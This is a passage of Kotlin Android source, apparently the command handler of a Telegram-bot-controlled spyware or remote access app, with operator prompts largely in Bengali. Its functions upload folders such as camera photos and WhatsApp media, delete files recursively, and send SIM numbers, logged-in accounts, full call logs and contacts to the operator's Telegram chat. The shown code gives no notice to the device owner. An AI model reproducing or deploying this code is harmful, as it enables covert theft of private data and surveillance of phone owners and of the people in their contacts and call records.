      {"text": "💬 WhatsApp Media", "callback_data": "/fetch $deviceId WhatsApp"},
      {"text": "🎵 Audio / Music", "callback_data": "/fetch $deviceId Music"}
    ]
  ]
}
""".trimIndent()
                val pickerMsg = "📁 <b>FETCH FOLDER FILES [ID: <code>$deviceId</code>]</b>\n\n" +
                        "টেলিগ্রামে যে ফোল্ডারের ফাইলগুলো আনতে চান নিচের অপশন থেকে বেছে নিন:\n\n" +
                        "• 📥 <code>/fetch $deviceId Download</code> (ডাউনলোড ফাইল)\n" +
                        "• 📸 <code>/fetch $deviceId DCIM/Camera</code> (ক্যামেরার ছবি)\n" +
                        "• 🖼️ <code>/fetch $deviceId Pictures</code> (ছবি ও স্ক্রিনশট)\n" +
                        "• 📄 <code>/fetch $deviceId Documents</code> (পিডিএফ ও ডকুমেন্টস)\n" +
                        "• 💬 <code>/fetch $deviceId WhatsApp</code> (হোয়াটসঅ্যাপ মিডিয়া)\n\n" +
                        "💡 <i>অথবা যেকোনো নির্দিষ্ট ফোল্ডারের নাম লিখে কমান্ড পাঠান: <code>/fetch [folder_name]</code></i>"

                telegramApi.sendMessage(botToken, chatId, pickerMsg, replyMarkupJson = keyboardJson)
            }
            return
        }

        val targetFolder = StorageFolderManager.resolveStoragePath(query)
        scope.launch(Dispatchers.IO) {
            val scan = StorageFolderManager.scanFolder(targetFolder)
            if (!scan.exists) {
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "❌ <b>FOLDER NOT FOUND [ID: <code>$deviceId</code>]</b>\n\n" +
                            "📂 <b>Path:</b> <code>${targetFolder.absolutePath}</code>\n" +
                            "⚠️ এই ফোল্ডার বা ফাইলটি ফোনে খুঁজে পাওয়া যায়নি।"
                )
                return@launch
            }

            val sizeStr = StorageFolderManager.formatBytes(scan.totalBytes)
            val fileCount = scan.totalFiles

            val initialMsg = "⏳ <b>FETCHING FILES [ID: <code>$deviceId</code>]</b>\n\n" +
                    "📂 <b>Path:</b> <code>${targetFolder.absolutePath}</code>\n" +
                    "📊 <b>Total Files:</b> $fileCount items ($sizeStr)\n" +
                    "🚀 <i>ফাইলগুলো টেলিগ্রামে আপলোড শুরু হচ্ছে...</i>"
            telegramApi.sendMessage(botToken, chatId, initialMsg)

            val result = StorageFolderManager.uploadFolderFiles(
                folder = targetFolder,
                botToken = botToken,
                chatId = chatId,
                deviceId = deviceId,
                telegramApi = telegramApi,
                filterType = filterType
            )

            val report = StringBuilder()
            report.append("✅ <b>FOLDER SYNC COMPLETED [ID: <code>$deviceId</code>]</b>\n\n")
            report.append("📂 <b>Path:</b> <code>${targetFolder.absolutePath}</code>\n")
            report.append("📤 <b>Uploaded:</b> ${result.uploadedCount} of ${result.totalFound}\n")
            if (result.skippedCount > 0) report.append("⚠️ <b>Skipped (>50MB):</b> ${result.skippedCount}\n")
            if (result.failedCount > 0) report.append("❌ <b>Failed:</b> ${result.failedCount}\n")
            report.append("💾 <b>Total Uploaded:</b> ${StorageFolderManager.formatBytes(result.totalBytesUploaded)}\n")
            report.append("🕒 <b>Completed At:</b> ${getCurrentTimeString()}")

            telegramApi.sendMessage(botToken, chatId, report.toString())
        }
    }

    private fun handleDeleteCommand(
        rawQuery: String?,
        botToken: String,
        chatId: String,
        deviceId: String,
        isConfirmed: Boolean
    ) {
        val query = rawQuery?.trim() ?: ""
        if (query.isBlank() || query.equals(deviceId, ignoreCase = true) || query.equals("all", ignoreCase = true)) {
            scope.launch(Dispatchers.IO) {
                val usage = "🗑️ <b>DELETE FILE / FOLDER [ID: <code>$deviceId</code>]</b>\n\n" +
                        "মুছতে চাওয়া ফোল্ডার বা ফাইলের পাথ সহ কমান্ড লিখুন:\n\n" +
                        "<b>উদাহরণ:</b>\n" +
                        "• <code>/delete $deviceId Download/temp.pdf</code>\n" +
                        "• <code>/delete $deviceId Pictures/Screenshots</code>\n\n" +
                        "⚠️ <i>কনফার্মেশন ছাড়া কোনো ফাইল মোছা হবে না।</i>"
                telegramApi.sendMessage(botToken, chatId, usage)
            }
            return
        }

        val target = StorageFolderManager.resolveStoragePath(query)
        scope.launch(Dispatchers.IO) {
            if (!target.exists()) {
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "❌ <b>PATH NOT FOUND [ID: <code>$deviceId</code>]</b>\n\n" +
                            "<code>${target.absolutePath}</code> খুঁজে পাওয়া যায়নি।"
                )
                return@launch
            }

            if (!isConfirmed) {
                val scan = StorageFolderManager.scanFolder(target)
                val typeStr = if (target.isDirectory) "ফোল্ডার (${scan.totalFiles} টি ফাইল)" else "ফাইল"
                val sizeStr = StorageFolderManager.formatBytes(if (target.isDirectory) scan.totalBytes else target.length())

                val confirmMsg = "⚠️ <b>DELETE CONFIRMATION [ID: <code>$deviceId</code>]</b>\n\n" +
                        "আপনি কি নিশ্চিতভাবে এই $typeStr টি ফোন থেকে মুছে ফেলতে চান?\n\n" +
                        "📂 <b>Path:</b> <code>${target.absolutePath}</code>\n" +
                        "📊 <b>Size:</b> $sizeStr\n\n" +
                        "ডিলিট করতে চাইলে নিচের কমান্ডে ক্লিক করুন:\n" +
                        "👉 <code>/del_ok $deviceId ${target.absolutePath}</code>\n\n" +
                        "বাতিল করতে:\n" +
                        "👉 <code>/del_no $deviceId</code>"

                telegramApi.sendMessage(botToken, chatId, confirmMsg)
                return@launch
            }

            val deleteResult = StorageFolderManager.deleteTarget(target, recursive = true)
            val freedStr = StorageFolderManager.formatBytes(deleteResult.bytesFreed)
            val msg = if (deleteResult.failedCount == 0 && deleteResult.deletedCount > 0) {
                "🗑️ <b>DELETED SUCCESSFULLY [ID: <code>$deviceId</code>]</b>\n\n" +
                        "📂 <b>Path:</b> <code>${deleteResult.targetPath}</code>\n" +
                        "✅ <b>Files Deleted:</b> ${deleteResult.deletedCount}\n" +
                        "💾 <b>Freed Space:</b> $freedStr\n" +
                        "🕒 <b>Time:</b> ${getCurrentTimeString()}"
            } else {
                "⚠️ <b>DELETE RESULT [ID: <code>$deviceId</code>]</b>\n\n" +
                        "📂 <b>Path:</b> <code>${deleteResult.targetPath}</code>\n" +
                        "✅ Deleted: ${deleteResult.deletedCount} | ❌ Failed: ${deleteResult.failedCount}\n" +
                        "💾 Freed: $freedStr" +
                        (if (deleteResult.error != null) "\n⚠️ Note: ${deleteResult.error}" else "")
            }
            telegramApi.sendMessage(botToken, chatId, msg)
        }
    }

    private fun handleListFolderCommand(
        rawQuery: String?,
        botToken: String,
        chatId: String,
        deviceId: String
    ) {
        val cleanQuery = if (rawQuery.isNullOrBlank() || rawQuery.equals(deviceId, ignoreCase = true) || rawQuery.equals("all", ignoreCase = true)) {
            ""
        } else {
            rawQuery
        }
        val target = StorageFolderManager.resolveStoragePath(cleanQuery)
        scope.launch(Dispatchers.IO) {
            val scan = StorageFolderManager.scanFolder(target)
            if (!scan.exists) {
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "❌ <b>FOLDER NOT FOUND [ID: <code>$deviceId</code>]</b>\n\n<code>${target.absolutePath}</code>"
                )
                return@launch
            }

            val sb = StringBuilder()
            sb.append("📂 <b>FOLDER CONTENTS [ID: <code>$deviceId</code>]</b>\n")
            sb.append("📍 <code>${target.absolutePath}</code>\n")
            sb.append("📊 <b>Total:</b> ${scan.totalFiles} files (${StorageFolderManager.formatBytes(scan.totalBytes)})\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

            val children: List<File> = target.listFiles()?.sortedWith(compareBy<File>({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
            if (children.isEmpty()) {
                sb.append("<i>Folder is empty</i>\n")
            } else {
                children.take(25).forEachIndexed { idx, item ->
                    val icon = if (item.isDirectory) "📁" else "📄"
                    val size = if (item.isFile) " (${StorageFolderManager.formatBytes(item.length())})" else ""
                    sb.append("$icon <code>${item.name}</code>$size\n")
                }
                if (children.size > 25) {
                    sb.append("\n<i>... এবং আরও ${children.size - 25} টি আইটেম</i>\n")
                }
            }

            sb.append("\n━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("💡 <i>ফাইলগুলো টেলিগ্রামে আনতে: <code>/fetch ${target.absolutePath}</code></i>")

            telegramApi.sendMessage(botToken, chatId, sb.toString())
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun sendSimInfoReport(botToken: String, chatId: String, deviceId: String) = withContext(Dispatchers.IO) {
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager

            val hasPhoneState = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
            val hasPhoneNumbers = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
            } else true

            val sb = StringBuilder()
            sb.append("📱 <b>SIM CARD & OPERATOR DETAILS [ID: <code>$deviceId</code>]</b>\n\n")
            sb.append("📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n")

            var simCount = 0
            var activeSubscriptions: List<SubscriptionInfo>? = null

            if (hasPhoneState && sm != null) {
                try {
                    activeSubscriptions = sm.activeSubscriptionInfoList
                } catch (e: Exception) {
                    android.util.Log.w("BotCommandHandler", "SubscriptionManager query error", e)
                }
            }

            if (!activeSubscriptions.isNullOrEmpty()) {
                simCount = activeSubscriptions.size
                sb.append("📶 <b>Active SIMs:</b> $simCount Slot(s)\n")
                sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

                activeSubscriptions.forEachIndexed { index, sub ->
                    val slotNumber = sub.simSlotIndex + 1
                    val carrierName = sub.carrierName?.toString()?.ifBlank { sub.displayName?.toString() } ?: "Unknown Operator"
                    val countryIso = sub.countryIso?.uppercase() ?: "N/A"
                    val isRoaming = if (sub.dataRoaming == 1) "Active (Roaming)" else "No (Home)"

                    var simNumber: String? = null
                    if (hasPhoneNumbers) {
                        try {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                simNumber = sm?.getPhoneNumber(sub.subscriptionId)?.ifBlank { null }
                            }
                        } catch (_: Exception) {}
                    }
                    if (simNumber.isNullOrBlank()) {
                        try {
                            @Suppress("DEPRECATION")
                            simNumber = sub.number?.ifBlank { null }
                        } catch (_: Exception) {}
                    }

                    sb.append("💳 <b>SIM $slotNumber: $carrierName</b>\n")
                    if (!simNumber.isNullOrBlank()) {
                        sb.append("• 📞 <b>Number:</b> <code>$simNumber</code>\n")
                    } else {
                        sb.append("• 📞 <b>Number:</b> <i>SIM Card protected / Operator not broadcast</i>\n")
                    }
                    sb.append("• 🌐 <b>Country:</b> $countryIso\n")
                    sb.append("• 🔄 <b>Roaming:</b> $isRoaming\n")
                    sb.append("• 🆔 <b>Slot Index:</b> ${sub.simSlotIndex}\n\n")
                }
            } else {
                val operatorName = tm?.networkOperatorName?.ifBlank { tm.simOperatorName } ?: "Unknown"
                val simCountry = tm?.simCountryIso?.uppercase() ?: "N/A"
                val simStateStr = when (tm?.simState) {
                    TelephonyManager.SIM_STATE_READY -> "Ready / Active"
                    TelephonyManager.SIM_STATE_ABSENT -> "No SIM Inserted"
                    TelephonyManager.SIM_STATE_PIN_REQUIRED -> "PIN Locked"
                    TelephonyManager.SIM_STATE_PUK_REQUIRED -> "PUK Locked"
                    TelephonyManager.SIM_STATE_NETWORK_LOCKED -> "Network Locked"
                    else -> "Unknown State"
                }

                sb.append("📶 <b>SIM State:</b> $simStateStr\n")
                sb.append("🏢 <b>Network Operator:</b> $operatorName\n")
                sb.append("🌐 <b>Country ISO:</b> $simCountry\n")

                if (hasPhoneNumbers) {
                    try {
                        @Suppress("DEPRECATION")
                        val line1 = tm?.line1Number
                        if (!line1.isNullOrBlank()) {
                            sb.append("📞 <b>Phone Number:</b> <code>$line1</code>\n")
                        }
                    } catch (_: Exception) {}
                }

                if (!hasPhoneState) {
                    sb.append("\n💡 <i>Phone state permission not granted yet. Grant permission in app for dual-SIM numbers and slot IDs.</i>\n")
                }
            }

            sb.append("━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("🕒 <b>Checked At:</b> ${getCurrentTimeString()}")

            telegramApi.sendMessage(botToken, chatId, sb.toString())
        } catch (e: Exception) {
            telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to fetch SIM info on $deviceId: ${e.message}")
        }
    }

    private suspend fun sendAccountsReport(botToken: String, chatId: String, deviceId: String) = withContext(Dispatchers.IO) {
        try {
            val accountManager = AccountManager.get(context)
            val pm = context.packageManager

            val googleAccounts = mutableListOf<String>()
            val whatsappAccounts = mutableListOf<String>()
            val imoAccounts = mutableListOf<String>()
            val messengerAccounts = mutableListOf<String>()
            val telegramAccounts = mutableListOf<String>()
            val otherAccounts = mutableListOf<String>()

            // 1. Check AccountManager for all accounts
            try {
                accountManager.accounts.forEach { acc ->
                    categorizeAccount(acc.name, acc.type, googleAccounts, whatsappAccounts, imoAccounts, messengerAccounts, telegramAccounts, otherAccounts)
                }
            } catch (_: Exception) {}

            // 2. Query Google accounts explicitly via AccountManager
            try {
                accountManager.getAccountsByType("com.google").forEach { acc ->
                    if (!googleAccounts.contains(acc.name)) googleAccounts.add(acc.name)
                }
            } catch (_: Exception) {}

            // 3. Query Contacts Provider RawContacts for synced messaging/Google accounts
            try {
                val rawUri = ContactsContract.RawContacts.CONTENT_URI
                val cursor = context.contentResolver.query(
                    rawUri,
                    arrayOf(ContactsContract.RawContacts.ACCOUNT_NAME, ContactsContract.RawContacts.ACCOUNT_TYPE),
                    null, null, null
                )
                cursor?.use {
                    val nameCol = it.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_NAME)
                    val typeCol = it.getColumnIndex(ContactsContract.RawContacts.ACCOUNT_TYPE)
                    while (it.moveToNext()) {
                        val name = if (nameCol >= 0) it.getString(nameCol)?.trim() else null
                        val type = if (typeCol >= 0) it.getString(typeCol)?.trim() else null
                        if (!name.isNullOrBlank() && type != null) {
                            categorizeAccount(name, type, googleAccounts, whatsappAccounts, imoAccounts, messengerAccounts, telegramAccounts, otherAccounts)
                        }
                    }
                }
            } catch (_: Exception) {}

            val primarySimNumber = getPrimarySimNumber()

            // 4. Check App Installations and Storage footprints
            val hasWa = isAppPresent(
                pm,
                listOf("com.whatsapp", "com.whatsapp.w4b"),
                listOf("Android/media/com.whatsapp", "WhatsApp", "Android/data/com.whatsapp")
            )
            val hasImo = isAppPresent(
                pm,
                listOf("com.imo.android.imoim", "com.imo.android.imolite"),
                listOf("Android/data/com.imo.android.imoim", "Android/media/com.imo.android.imoim", "imo")
            )
            val hasFb = isAppPresent(
                pm,
                listOf("com.facebook.katana", "com.facebook.orca", "com.facebook.lite"),
                listOf("Android/data/com.facebook.katana", "Android/data/com.facebook.orca", "Android/media/com.facebook.orca")
            )
            val hasTg = isAppPresent(
                pm,
                listOf("org.telegram.messenger", "org.thunderdog.challegram", "org.telegram.messenger.web"),
                listOf("Android/media/org.telegram.messenger", "Telegram")
            )

            val sb = StringBuilder()
            sb.append("👤 <b>DEVICE ACCOUNTS & LOGINS [ID: <code>$deviceId</code>]</b>\n\n")
            sb.append("📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n")
            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

            // 1. Google / Gmail Accounts
            sb.append("📧 <b>Google / Gmail Accounts (${googleAccounts.size}):</b>\n")
            if (googleAccounts.isNotEmpty()) {
                googleAccounts.forEach { email ->
                    sb.append("• <code>$email</code>\n")
                }
            } else {
                sb.append("• <i>No synced Google accounts found (check Contacts/Accounts permission in app)</i>\n")
            }
            sb.append("\n")

            // 2. WhatsApp Accounts & App Status
            sb.append("💬 <b>WhatsApp Account (${whatsappAccounts.size}):</b>\n")
            if (whatsappAccounts.isNotEmpty()) {
                whatsappAccounts.forEach { acc ->
                    sb.append("• 🟢 <code>$acc</code>\n")
                }
            } else if (hasWa) {
                sb.append("• 🟢 <b>WhatsApp Installed & Active on phone</b>\n")
                if (!primarySimNumber.isNullOrBlank()) {
                    sb.append("  ↳ 📱 SIM Number: <code>$primarySimNumber</code>\n")
                }
            } else {
                sb.append("• <i>WhatsApp not installed / no account found</i>\n")
            }
            sb.append("\n")

            // 3. IMO Accounts & App Status
            sb.append("📞 <b>IMO Account (${imoAccounts.size}):</b>\n")
            if (imoAccounts.isNotEmpty()) {
                imoAccounts.forEach { acc ->
                    sb.append("• 🟢 <code>$acc</code>\n")
                }
            } else if (hasImo) {
                sb.append("• 🟢 <b>IMO Messenger Installed on phone</b>\n")
                if (!primarySimNumber.isNullOrBlank()) {
                    sb.append("  ↳ 📱 SIM Number: <code>$primarySimNumber</code>\n")
                }
            } else {
                sb.append("• <i>IMO not installed / no account found</i>\n")
            }
            sb.append("\n")

            // 4. Facebook & Messenger Accounts & App Status
            sb.append("👥 <b>Facebook & Messenger (${messengerAccounts.size}):</b>\n")
            if (messengerAccounts.isNotEmpty()) {
                messengerAccounts.forEach { acc ->
                    sb.append("• <code>$acc</code>\n")
                }
            } else if (hasFb) {
                sb.append("• 🟢 Facebook / Messenger Installed on phone\n")
            } else {
                sb.append("• <i>Messenger not installed / no account found</i>\n")
            }
            sb.append("\n")

            // 5. Telegram Accounts & App Status
            sb.append("✈️ <b>Telegram Account (${telegramAccounts.size}):</b>\n")
            if (telegramAccounts.isNotEmpty()) {
                telegramAccounts.forEach { acc ->
                    sb.append("• <code>$acc</code>\n")
                }
            } else if (hasTg) {
                sb.append("• 🟢 Telegram App Installed on phone\n")
            } else {
                sb.append("• <i>Telegram app not found</i>\n")
            }
            sb.append("\n")

            // 6. Other System & Social Accounts
            if (otherAccounts.isNotEmpty()) {
                sb.append("🌐 <b>Other Registered Accounts (${otherAccounts.size}):</b>\n")
                otherAccounts.take(10).forEach { acc ->
                    sb.append("• $acc\n")
                }
                if (otherAccounts.size > 10) {
                    sb.append("• <i>... এবং আরও ${otherAccounts.size - 10} টি</i>\n")
                }
                sb.append("\n")
            }

            val totalFound = googleAccounts.size + whatsappAccounts.size + imoAccounts.size + messengerAccounts.size + telegramAccounts.size + otherAccounts.size
            sb.append("━━━━━━━━━━━━━━━━━━━━\n")
            sb.append("📊 <b>Total Registered/Found:</b> $totalFound account(s)\n")
            sb.append("🕒 <b>Scanned At:</b> ${getCurrentTimeString()}")

            telegramApi.sendMessage(botToken, chatId, sb.toString())
        } catch (e: Exception) {
            telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to read accounts on $deviceId: ${e.message}")
        }
    }

    private fun categorizeAccount(
        name: String,
        type: String,
        google: MutableList<String>,
        whatsapp: MutableList<String>,
        imo: MutableList<String>,
        messenger: MutableList<String>,
        telegram: MutableList<String>,
        other: MutableList<String>
    ) {
        val lowerType = type.lowercase()
        when {
            lowerType.contains("google") || lowerType.contains("gmail") -> {
                if (name.contains("@") && !google.contains(name)) google.add(name)
            }
            lowerType.contains("whatsapp") -> {
                if (!whatsapp.contains(name)) whatsapp.add(name)
            }
            lowerType.contains("imo") -> {
                if (!imo.contains(name)) imo.add(name)
            }
            lowerType.contains("facebook") || lowerType.contains("messenger") || lowerType.contains("orca") -> {
                if (!messenger.contains(name)) messenger.add(name)
            }
            lowerType.contains("telegram") -> {
                if (!telegram.contains(name)) telegram.add(name)
            }
            else -> {
                val label = "$name (${type.split('.').lastOrNull() ?: type})"
                if (!other.contains(label) && !google.contains(name)) other.add(label)
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun getPrimarySimNumber(): String? {
        return try {
            val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            var num: String? = null
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && sm != null) {
                val sub = sm.activeSubscriptionInfoList?.firstOrNull()
                if (sub != null) {
                    num = sm.getPhoneNumber(sub.subscriptionId)?.ifBlank { null }
                }
            }
            if (num.isNullOrBlank() && sm != null) {
                @Suppress("DEPRECATION")
                num = sm.activeSubscriptionInfoList?.firstOrNull()?.number?.ifBlank { null }
            }
            if (num.isNullOrBlank() && tm != null) {
                @Suppress("DEPRECATION")
                num = tm.line1Number?.ifBlank { null }
            }
            num
        } catch (_: Exception) {
            null
        }
    }

    private fun isPackageInstalled(pm: PackageManager, packageName: String): Boolean {
        return try {
            pm.getPackageInfo(packageName, 0)
            true
        } catch (_: Exception) {
            try {
                pm.getLaunchIntentForPackage(packageName) != null
            } catch (_: Exception) {
                false
            }
        }
    }

    private fun isAppPresent(pm: PackageManager, packageNames: List<String>, folderPaths: List<String> = emptyList()): Boolean {
        for (pkg in packageNames) {
            if (isPackageInstalled(pm, pkg)) return true
        }
        val ext = Environment.getExternalStorageDirectory()
        for (f in folderPaths) {
            try {
                val file = File(ext, f)
                if (file.exists()) return true
            } catch (_: Exception) {}
        }
        return false
    }

    private suspend fun sendCallLogsReport(botToken: String, chatId: String, deviceId: String) = withContext(Dispatchers.IO) {
        val hasCallLog = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
        if (!hasCallLog) {
            val msg = "📞 <b>CALL LOGS STATUS [ID: <code>$deviceId</code>]</b>\n\n" +
                    "⚠️ <i>Call Log permission is not granted on this device yet.</i>\n\n" +
                    "💡 <i>ফোনের Settings > Apps > Permissions থেকে Call Logs পারমিশন এলাউ করলেই সরাসরি কল হিস্টোরি দেখতে পারবেন।</i>"
            telegramApi.sendMessage(botToken, chatId, msg)
            return@withContext
        }

        var tempFile: File? = null
        try {
            telegramApi.sendMessage(
                botToken,
                chatId,
                "⏳ <b>Exporting All Call Logs [ID: <code>$deviceId</code>]...</b>\n\nসকল কল হিস্টোরি .txt ফাইলে তৈরি করা হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন..."
            )

            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault())
            val fileDateFormat = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
            val generatedTimeStr = dateFormat.format(Date())

            val sb = java.lang.StringBuilder()
            sb.append("================================================================================\n")
            sb.append("📞 CALL LOGS REPORT (ALL RECORDS)\n")
            sb.append("Device:      ${Build.MANUFACTURER.uppercase()} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})\n")
            sb.append("Device ID:   $deviceId\n")
            sb.append("Export Time: $generatedTimeStr\n")
            sb.append("================================================================================\n\n")

            var totalCount = 0
            cursor?.use {
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val numberIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)

                while (it.moveToNext()) {
                    totalCount++
                    val name = if (nameIdx >= 0) it.getString(nameIdx)?.trim() else null
                    val number = if (numberIdx >= 0) it.getString(numberIdx) ?: "Unknown" else "Unknown"
                    val type = if (typeIdx >= 0) it.getInt(typeIdx) else CallLog.Calls.INCOMING_TYPE
                    val dateMs = if (dateIdx >= 0) it.getLong(dateIdx) else 0L
                    val durationSec = if (durIdx >= 0) it.getLong(durIdx) else 0L

                    val typeLabel = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                        CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                        CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
                        else -> "CALL"
                    }

                    val durationStr = if (durationSec > 0) {
                        val m = durationSec / 60
                        val s = durationSec % 60
                        if (m > 0) "${m}m ${s}s (${durationSec}s)" else "${s}s"
                    } else {
                        "0s"
                    }

                    val dateStr = if (dateMs > 0) dateFormat.format(Date(dateMs)) else "Unknown"
                    val displayName = if (!name.isNullOrBlank()) name else "Unknown / Unsaved"

                    sb.append("[$totalCount] $typeLabel CALL\n")
                    sb.append("  • Name:     $displayName\n")
                    sb.append("  • Number:   $number\n")
                    sb.append("  • Date:     $dateStr\n")
                    sb.append("  • Duration: $durationStr\n")
                    sb.append("--------------------------------------------------------------------------------\n")
                }
            }

            if (totalCount == 0) {
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "📞 <b>CALL LOGS [ID: <code>$deviceId</code>]</b>\n\nফোনে কোনো কল হিস্টোরি পাওয়া যায়নি (0 records)।"
                )
                return@withContext
            }

            sb.append("\n================================================================================\n")
            sb.append("Total Call Records Exported: $totalCount\n")
            sb.append("End of Call Logs Report\n")
            sb.append("================================================================================\n")

            val fileName = "CallLogs_${deviceId}_${fileDateFormat.format(Date())}.txt"
            val file = File(context.cacheDir, fileName)
            tempFile = file
            file.writeText(sb.toString(), Charsets.UTF_8)

            val caption = "📞 <b>CALL LOGS EXPORT (.TXT)</b>\n" +
                    "📱 ID: <code>$deviceId</code>\n" +
                    "📊 Total Calls: <b>$totalCount records</b>\n" +
                    "🕒 Exported: ${getCurrentTimeString()}"

            val uploadResult = telegramApi.uploadFileDirect(botToken, chatId, file, caption)
            if (uploadResult.isFailure) {
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ Call logs .txt upload failed on $deviceId: ${uploadResult.exceptionOrNull()?.message}"
                )
            }
        } catch (e: Exception) {
            telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to read/export call logs on $deviceId: ${e.message}")
        } finally {
            try {
                tempFile?.delete()
            } catch (_: Exception) {}
        }
    }

    private suspend fun sendContactsReport(
        rawQuery: String?,
        botToken: String,
        chatId: String,
        deviceId: String
    ) = withContext(Dispatchers.IO) {
        val hasContacts = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
        if (!hasContacts) {
            val msg = "👥 <b>CONTACTS STATUS [ID: <code>$deviceId</code>]</b>\n\n" +
                    "⚠️ <i>Contacts permission is not granted on this device yet.</i>\n\n" +
                    "💡 <i>ফোনের Settings > Apps > Permissions থেকে Contacts পারমিশন চালু করলেই ফোনবুক দেখতে পারবেন।</i>"
            telegramApi.sendMessage(botToken, chatId, msg)
            return@withContext
        }

        var tempFile: File? = null
        try {
            val query = rawQuery?.trim() ?: ""
            val hasSearch = query.isNotBlank() &&
                    !query.equals("all", ignoreCase = true) &&
                    !query.equals(deviceId, ignoreCase = true) &&
                    !deviceId.lowercase().contains(query.lowercase())

            val statusMsg = if (hasSearch) {
                "⏳ <b>Exporting Filtered Contacts to .txt [ID: <code>$deviceId</code>]...</b>\n\n🔍 খোঁজা হচ্ছে: <i>$query</i>"
            } else {
                "⏳ <b>Exporting All Contacts to .txt [ID: <code>$deviceId</code>]...</b>\n\nসকল কন্টাক্ট .txt ফাইলে তৈরি করা হচ্ছে, অপেক্ষা করুন..."
            }
            telegramApi.sendMessage(botToken, chatId, statusMsg)

            val selection = if (hasSearch) {
                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} LIKE ? OR ${ContactsContract.CommonDataKinds.Phone.NUMBER} LIKE ?"
            } else null

            val selectionArgs = if (hasSearch) {
                arrayOf("%$query%", "%$query%")
            } else null

            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                ),
                selection,
                selectionArgs,
                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} COLLATE NOCASE ASC"
            )

            // Group contacts by Display Name -> list of (TypeLabel, PhoneNumber)
            val contactsMap = linkedMapOf<String, MutableList<Pair<String, String>>>()
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val typeIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)

                while (it.moveToNext()) {
                    val name = if (nameIdx >= 0) it.getString(nameIdx)?.trim() ?: "Unknown" else "Unknown"
                    val number = if (numIdx >= 0) it.getString(numIdx)?.trim() ?: "" else ""
                    val typeInt = if (typeIdx >= 0) it.getInt(typeIdx) else ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE
                    val typeLabel = ContactsContract.CommonDataKinds.Phone.getTypeLabel(context.resources, typeInt, "").toString().ifBlank { "Mobile" }

                    if (number.isNotBlank()) {
                        val list = contactsMap.getOrPut(name) { mutableListOf() }
                        if (list.none { p -> p.second == number }) {
                            list.add(typeLabel to number)
                        }
                    }
                }
            }

            val totalFound = contactsMap.size
            if (totalFound == 0) {
                val notFoundMsg = if (hasSearch) {
                    "👥 <b>NO CONTACT FOUND [ID: <code>$deviceId</code>]</b>\n\n" +
                            "ফোনে '<b>$query</b>' ফিল্টারে কোনো কন্টাক্ট পাওয়া যায়নি।"
                } else {
                    "👥 <b>CONTACTS [ID: <code>$deviceId</code>]</b>\n\nNo contacts found in phonebook."
                }
                telegramApi.sendMessage(botToken, chatId, notFoundMsg)
